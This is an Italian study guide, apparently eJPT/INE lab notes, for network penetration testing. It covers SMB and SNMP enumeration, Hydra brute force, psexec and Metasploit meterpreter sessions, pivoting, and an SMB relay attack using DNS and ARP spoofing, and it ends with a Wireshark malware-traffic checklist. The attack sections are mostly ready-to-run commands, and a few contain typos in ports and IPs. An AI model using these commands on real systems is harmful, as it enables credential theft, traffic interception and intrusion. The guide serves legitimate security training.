# Host & Network Penetration Testing: Network Based Attacks

## SMB & NetBIOS Enumeration

Windows Enumeration

### Netbios Enumeration

Di seguito un elenco di SW utili per fare scan delle reti con Netbios.

#### Nbtscan

```
nbtscan
whatis nbtscan
nbtscan 10.4.30.0/24
```

#### Nmblookup

```
nmblookup -A 10.4.30.139
// proviamo a usare un nmap scan con script per avere più info sulla porta NetBIOS
nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n 10.4.30.139
```

#### nbtstat

```
nbtstat --help
```

### SMB Enumeration

#### Verifica se porta è aperta e versione

```
nmap -sV -p 139,445 demo.ine.local
```

#### Enumerazione con script nmap

```
// Per controllare gli script di nmap:
ls -al /usr/share/nmap/scripts/ | grep -e "smb-*"
// Utilizziamo il motore nmap scripting engine per enumerare la versione di SMB:
nmap -p455 --script smb-protocols demo.ine.local
```

#### Verificare il livello di sicurezza di SMB configurato

```
nmap -p445 --script smb-security-mode demo.ine.local
```

Questo ci può dire che lo script è stato eseguito come guest, livello di autenticazione "utente", è supportato e la firma dei messaggi è disabilitata. In tal caso si può accedere come guest user, che è un utente di default in tutte le versioni di windows.

#### Per testare specifiche vulnerabilità legate a SMB v1 come anonymous access

```
smbclient -L demo.ine.local //e premiamo enter senza inserire una password per testare l'accesso anonimo
```

#### Enumerazione degli utenti del PC Windows

Possibile nel caso in cui abbiamo anonymous access con SMB v1

```
nmap -p445 --script smb-enum-users.nse 10.4.30.139
```

#### Brute force delle password degli utenti

Usiamo Hydra come tool, ma potremmo usare anche crackmapexec

```
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt demo.ine.local smb
```

### Colleghiamoci alla vittima con le credenziali trovate via SMB

#### Usando psexec.py

```
psexec.py administrator@demo.ine.local //e inseriamo la password
//e possiamo poi fare un po' di local enumeration
whoami
```

#### Usando il modulo psexec di MSF

```
msfconsole -q
search psexec
use exploit/windows/smb/psexec
show options
set RHOSTS demo.ine.local
set SMBUser administrator
set SMBPass password1
set payload windows/x64/meterpreter/reverse_tcp
exploit
sysinfo
```

### Pivoting su secondo target in altra rete

#### Impostiamo un system-wide proxy per poter raggiungere la seconda vittima (demo1) facendo pivoting sulla prima (demo)

```
ping 10.4.26.4
// funziona quindi terminiamo la sessione CMD sul target 1
// per tornare a quella meterpreter e configurare l'autoroute e fare il pivoting
run autoroute -s 10.4.26.0/20
background //mettiamo in background la sessione
// impostiamo un system-wide proxy con il modulo MSF metasploit proxy module
//verifichiamo su un altro terminale la versione di proxychains installata e la porta configurata con: cat /etc/proxychains.conf o /etc/proxychains4.conf
search socks
use auxiliary/server/socks_proxy
show options
set VERSION 4a //perché usiamo socks4
set SRVPORT 9050 //perché è quella configurata in /etc/proxychains4.conf
exploit
// ora che abbiamo un system-wide proxy possiamo fare una verifica spostandoci in un altro terminale:
```

#### Enumeration delle shares della seconda vittima demo1.ine.local, le montiamo sulla prima vittima e ne accediamo al contenuto

```
// ora che abbiamo un system-wide proxy possiamo fare una verifica spostandoci in un altro terminale:
    netstat -antp //e troviamo la porta 9050 in ascolto sul sistema
    proxychains nmap demo1.ine.local -sT -Pn -sV -p 445 //ora è raggiungibile dal sistema kali attaccante. -sT è per standard TCP connect scan
    //e troviamo un sistema windows running sul target demo1.
// torniamo sulla sessione iniziale in meterpreter (quella dentro demo.ine.local) sul terminale 1 e 
//   vediamo se riusciamo a interagire con il secondo target demo1.ine.local
sessions 2
shell
net view 10.4.26.4
// ci dà errore quindi proviamo a terminare con CTRL+C la sessione cmd per tornare a quella meterpreter
migrate -N explorer.exe
shell 
net view 10.4.26.4 //ed ora ci dà un risultato con le shares condivise da demo1
//assegniamo ora delle lettere (Drive letters) a ognuna delle cartelle condivise da demo1, per navigarle dal file system di demo
net use D: \\10.4.26.4\Documents
net use K: \\10.4.26.4\K$
dir D:  //così vediamo che in D c'è un file Confidential.txt e FLAG2.txt
dir K:  //così vediamo che in K c'è un altro file txt
```

Siamo riusciti ad accedere ai file della seconda vittima (demo1) montando le cartelle condivise (le shares) sulla prima vittima (demo) a cui avevamo ottenuto accesso tramite psexec a seguito del brute force delle credenziali.

## SNMP Enumeration

### nmap scan per identificare le porte UDP di SNMP

```
nmap -sU -sV -p 161,162 demo.ine.local
```

### Bruteforce per le SNMP community strings

```
ls -al /usr/share/nmap/scripts/ | grep "snmp"
ls -al /usr/share/nmap/nselib/data/ | grep snmp //wordlist usata da modulo MSF per bruteforce
nmap -sU -p 161 --script=snmp-brute demo.ine.local
```

### Enumeration date le community strings

```
snmpwalk -v 1 -c public demo.ine.local // questo ci permette di elencare tante informazioni data la community string public, ma poco leggibili
nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_info //questo ci dà un risultato analogo ma più leggibile
cat snmp_info
```

Possiamo enumerare le seguenti informazioni:

* Software installati (Amazon SSM, Firefox, ...)
* Tabelle di routing
* Brute force delle community strings
* I servizi in esecuzione sul sistema Windows a 32 bit
* Processi in esecuzione
* Interfacce di rete
* Gli account utente sulla macchina
* Una descrizione del sistema con HW, SW e tempo di accensione

{% hint style="info" %}
Importante: avendo ora gli utenti si può fare un tentativo di brute force della password ad esempio con SMB.
{% endhint %}

### Bruteforce credenziali utenti Windows del sistema via SMB <a href="#bruteforce-credenziali-utenti-windows-del-sistema-via-smb" id="bruteforce-credenziali-utenti-windows-del-sistema-via-smb"></a>

```
hydra -l Administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
```

A questo punto si può usare psexec o provare ad autenticarsi via RDP se la porta è aperta.

## SMB Relay Attack

<figure><img src="../.gitbook/assets/image (987).png" alt=""><figcaption></figcaption></figure>

### Impostare un SMB Relay con un modulo MSF

```
msfconsole
search smb_relay
use exploit/windows/smb/smb_relay
show options
set SRVHOST 172.16.5.101 //IP nostra Kali attaccante
set LHOST 172.16.5.101 //stesso IP nostra Kali attaccante
set SMBHOST 172.16.5.10 //l'IP del target
exploit
```

### Configuriamo il DNS Spoofing

In modo da redirezionare la vittima alla nostra macchina Kali Linux ogni volta che c'è una connessione a qualsiasi host nel dominio (sportsfoo.com)

Apriamo quindi un nuovo TAB e creiamo un file che emula un host file o un file che contiene record DNS

```
echo "172.16.5.101 *.sportsfoo.com" > dns  //andiamo a redirezionare qualsiasi sottodominio del top level domain alla nostra macchina attaccante
dnsspoof -i eth1 -f dns
```

Il file dns che abbiamo creato ha l'obiettivo di redirezionare ogni richiesta ad un dominio o sottodominio di sportsfoo.com al nostro sistema kali linux.

### Impostiamo l'attacco Man in the Middle con ARP Spoofing <a href="#impostiamo-lattacco-man-in-the-middle-con-arp-spoofing" id="impostiamo-lattacco-man-in-the-middle-con-arp-spoofing"></a>

L'obiettivo è quello di fare poisoning del traffico tra la vittima (Windows 7, 172.16.5.5) ed il default gateway (172.16.5.1).

Questo ci consente di manipolare il traffico con DNS Spoof che abbiamo già impostato e running.

Apriamo un altro terminale:

```
echo 1 /proc/sys/net/ipv4/ip_forward //abilitiamo IP forwarding
```

### Avviamo l'ARP spoof dell'attacco <a href="#avviamo-larp-spoof-dellattacco" id="avviamo-larp-spoof-dellattacco"></a>

Ora, in due terminali separati, avviamo l'ARP spoof attack contro il sistema vittima Windows 7 e il Gateway.

#### Terminale 1: Client Windows 7 <a href="#terminale-1-client-windows-7" id="terminale-1-client-windows-7"></a>

```
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
```

#### Terminale 2: Gateway

Apriamo un nuovo tab del terminale e facciamo l'ARP spoof contro il gateway facendo poisoning di quel traffico

```
arpspoof -i eth1 172.16.5.1 182.16.5.5
```

{% hint style="info" %}
ARP Poisoning: \
Ora quello che sta succedendo è che ogni volta che il sistema vittima Windows 7 avvia una SMB connection, il DNSspoof assieme all'ARPspoof forges (crea) una risposta DNS che dice alla vittima che l'indirizzo DNS che sta cercando la vittima si risolve (resolves) con l'indirizzo IP del sistema Kali attaccante.
{% endhint %}

### Esito

Se andiamo nel secondo tab dove abbiamo fatto (performed) il DNS spoofing, dovremmo iniziare a vedere delle richieste per dei domini o sottodomini specifici.

Torniamo al terminale e vediamo che abbiamo intercettato una richiesta di connessione SMB a fileserver.sportsfoo.com.

Guardiamo cosa succede nella sessione metasploit:

Ogni volta che c'è una incoming SMB connection il modulo smb\_relay in MSF cattura l'hash e automaticamente lo usa per ottenere una meterpreter session o shell sulla vittima, che in questo caso è 172.16.5.10 ossia fileserver.sportsfoo.com, lo abbiamo configurato noi con l'SMBHOST option.

Se andiamo quindi dentro la sessione 1 possiamo accedere alla macchina vittima (fileserver).

#### Usare la sessione meterpreter aperta

```
//andiamo sul tab contenente metasploit
sessions
sessions 1
getuid
sysinfo
```

Possiamo potenzialmente provare a usare gli hash su tutti i server nella rete per vedere a quali altri riusciamo ad avere accesso.

### Conclusioni

Abbiamo ingannato il client facendo spoofing dei record DNS, che assieme al fatto che abbiamo fatto l'SMB relay attack, abbiamo ottenuto una meterpreter session sul sistema target, che era fileserver.

## DNS & SMB Relay Attack (Lab)

### Scenario

You are hired by a small company to perform a security assessment. Your customer is **sportsfoo.com** and they want your help to test the security of their environment, according to the scope below:

**The assumptions of this security engagement are:**

1. You are going to do an internal penetration test, where you will be connected directly into their LAN network **172.16.5.0/24**. The scope in this test is only the **172.16.5.0/24** segment
2. You are in a production network, so you should not lock any user account by guessing their usernames and passwords

The following image represents the LAB environment:

<figure><img src="https://assets.ine.com/content/ptp/dns_and_smb_relay_attack/0.png" alt=""><figcaption></figcaption></figure>

#### Goals

* Exploitation using **SMB Relay Attack**
* Manipulating network traffic with **dnsspoof**

#### What you will learn

* How to use the **SMB Relay Attack** in order to compromise patched hosts.
* How to use the **dnsspoof** tool in order to redirect systems to the host that you control.

#### Recommended tools

* **dnsspoof**
* **Metasploit**

***

### Tasks <a href="#tasks" id="tasks"></a>

Launch an attack using the **SMB Relay Exploit** in a way that once the Client (**172.16.5.5**) issues a **SMB** connection to any hosts on the _**.sportsfoo.com** domain it can be redirected to your Metasploit server, and then you can use its credentials to get a shell on the target machine (172.16.5.10_\*).

This is a graphic that represents how this attack should work:![](https://images.gitbook.com/__img/dpr=2,width=760,onerror=redirect,format=auto,signature=639916641/https%3A%2F%2Fassets.ine.com%2Fcontent%2Fptp%2Fdns_and_smb_relay_attack%2F3.png)

1. Client (Windows 7) issues a **SMB** connection to \[**\\\fileserver.sportsfoo.com\finance$**] at every **30** seconds or so.
2. The attacker machine intercepts this request and spoofs the IP address of **fileserver.sportsfoo.com**.
3. Then the Windows 7 system issues a **SMB** connection to \[**\\\172.16.5.101**] (attacker machine) instead of using the real IP of the **fileserver.sportsfoo.com**.
4. The **SMB Relay exploit** is already listening, receives the **SMB** connection, and relays the authentication to the target machine. The payload is a Windows Meterpreter shell.
5. Once the exploit authenticates on the target machine, a reverse meterpreter session is provided to the pentester.

### Solution

### **Step 1:** Start **msfconsole** and configure the SMB Relay exploit:&#x20;

```
msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST 172.16.5.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10
exploit
```

### **Step 2:** Configure **dnsspoof** in order to redirect the victim to our Metasploit system

Configure **dnsspoof** in order to redirect the victim to our Metasploit system every time there's an SMB connection to any host in the domain: **sportsfoo.com**. Create a file with fake dns entry with all subdomains of **sportsfoo.com** pointing to our attacker machine.

```
echo "172.16.5.101 *.sportsfoo.com" > dns
dnsspoof -i eth1 -f dns
```

### **Step 3:** Activate the **MiTM** attack using the **ARP Spoofing** technique. <a href="#step-3" id="step-3"></a>

Our goal is to poison the traffic between our victim, **Windows 7** at **172.16.5.5**, and the default gateway at **172.16.5.1**.

In this way, we can manipulate the traffic using **dnsspoof**, which is already running.

In order to perform an **ARP Spoofing** attack, we need to enable the IP forwarding as follow:

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

In two separate terminals, start the **ARP Spoof attack** against **172.16.5.5** and **172.16.5.1** using these commands:

```
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
```

So, every time the victim (**Windows 7**) starts an **SMB connection**, **dnsspoof** aligned with the **ARP Spoof** attack, forges the **DNS** replies telling that the searched **DNS** address is hosted at the attacker machine

For example, from the previous results, Windows 7 has started an SMB connection for \[**\\\fileserver.sportsfoo.com\AnyShare**].&#x20;

Then instead of getting a DNS response with the real IP address of **fileserver.sportsfoo.com**, it received the IP of the attacker: **172.16.5.101**.&#x20;

Consequently, the SMB connection is hijacked to \[**\\\172.16.5.101\AnyShare**].&#x20;

In Metasploit, every time there is an incoming **SMB** connection, the **SMB Relay exploit** grab the **SMB hashes**(credentials) and then uses them to get a shell on the target machine (**172.16.5.10** - since it was set in the **SMBHOST** field of the **smb-relay** exploit).

The SMB Relay attack was successful, and we were able to obtain a meterpreter session on the target machine. This was possible because the credentials used on the fileserver and the target machine are the same.

### **Step 4:** Interact with the meterpreter session.

```
sessions
sessions -i 1
getuid
```

In this lab, we were able to trick the client by spoofing DNS records, this, in turn, combined with SMB relay attack, provided us with a meterpreter session on the target machine with administrative privileges.

## 🧠 Wireshark – Network Analysis (PCAP Analysis)

Questa guida è pensata come **checklist operativa da esame INE / eJPT**, basata su un **lab reale**.\
Seguila **in ordine**, senza andare a caso.

***

### 🔁 Metodo mentale (prima di usare i filtri)

Chiediti SEMPRE:

1. Chi è il **client infetto**?
2. Con chi comunica?
3. Quali **protocolli** usa?
4. Cosa scarica/esegue?
5. Ci sono **credenziali, script o wallet**?

***

### 1️⃣ Individuare traffico sospetto HTTP

#### Filtri base

```wireshark
http
```

Solo HTTP OK:

```wireshark
http.response.code == 200
```

HTTP di un host specifico:

```wireshark
http && ip.addr == <IP_CLIENT>
```

### 2️⃣ Trovare dominio malevolo (Flag tipo 1)

#### Metodo

1. Filtra HTTP 200
2. Guarda **Host** header
3. Conferma con TCP Stream

#### Filtro

```wireshark
http.response.code == 200
```

#### TCP Stream

* Right click → **Follow → TCP Stream**
* Cerca:

```
Host: <domain>
HTTP/1.1 200 OK
```

📌 Rispondi **solo con il dominio**, senza `http://`

### 3️⃣ Identificare IP e MAC del client infetto (Flag tipo 2)

#### IP del client

Usa DNS o traffico verso dominio malevolo:

```wireshark
ip.addr == <IP_SERVER>
```

→ L’IP privato è il client

#### MAC address (ARP)

```wireshark
arp
```

Cerca:

```
<IP_CLIENT> is at <MAC>
```

Oppure:

* Espandi **Ethernet II**
* Guarda Source MAC quando l’IP client è sorgente

### 4️⃣ Hostname Windows via NBNS (Flag tipo 3)

#### Filtro corretto

```wireshark
nbns
```

Con IP client:

```wireshark
nbns && ip.addr == <IP_CLIENT>
```

#### Dove guardare

Packet Details → **NetBIOS Name Service**

Esempio:

```
DESKTOP-XXXXX<00>
```

👉 Hostname = `DESKTOP-XXXXX`

### 5️⃣ Individuare PowerShell e script eseguiti (Flag tipo 4)

#### Filtri utili

```wireshark
frame contains "PowerShell"
```

```wireshark
frame contains "ps1"
```

#### TCP Stream

* Follow → TCP Stream
* Cerca path:

```
C:\Users\<USERNAME>\Documents\mystery_file.ps1
```

👉 **USERNAME = utente infetto**

### 6️⃣ Identificare User-Agent PowerShell (Flag tipo 5)

#### Filtro

```wireshark
frame contains "User-Agent"
```

Esempio header:

```http
User-Agent: Mozilla/5.0 (...) WindowsPowerShell/5.1.xxxx
```

👉 Stringa indicativa richiesta da INE:

```
WindowsPowerShell
```

📌 INE chiede **la keyword**, non l’header completo

### 7️⃣ Wallet extension ID (Flag tipo 6)

#### Metodo

1. Torna al TCP Stream PowerShell
2. Usa **Find** → `coinbase`
3. Cerca mapping ID | Wallet

#### Esempio

```
hnfanknocfeofbddgcijnmhnfnkdnaad | Coinbase
```

👉 Risposta = **solo l’ID**

***

### 🔎 Filtri universali da MEMORIZZARE

```wireshark
http
ip.addr == x.x.x.x
arp
nbns
udp.port == 137
frame contains "password"
frame contains "powershell"
frame contains "ps1"
frame contains "User-Agent"
```

***

### ⚠️ Errori comuni all’esame

* ❌ Usare conoscenza esterna invece del PCAP
* ❌ Risposte troppo lunghe
* ❌ Confondere hostname / username
* ❌ Ignorare TCP Stream

***

### ✅ Checklist finale da esame

* [ ] Dominio malevolo
* [ ] IP client
* [ ] MAC client
* [ ] Hostname Windows
* [ ] Utente infetto
* [ ] User-Agent PowerShell
* [ ] Wallet / payload / C2
